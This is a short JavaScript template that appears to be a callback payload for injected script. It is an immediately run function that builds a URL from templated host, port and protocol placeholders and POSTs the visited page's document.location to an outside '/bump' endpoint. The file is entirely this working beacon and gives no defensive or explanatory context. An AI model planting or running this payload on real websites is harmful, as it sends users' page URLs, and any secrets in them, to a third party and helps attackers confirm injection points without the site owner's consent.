(function () {
    host = "{{host}}";
    port = "{{port}}";
    path = "bump";

    var xhr = new XMLHttpRequest();
    url = "http{{ssl}}://" + host + ":" + port + "/" + path;
    xhr.open("POST", url, true);
    xhr.send(document.location);
})();
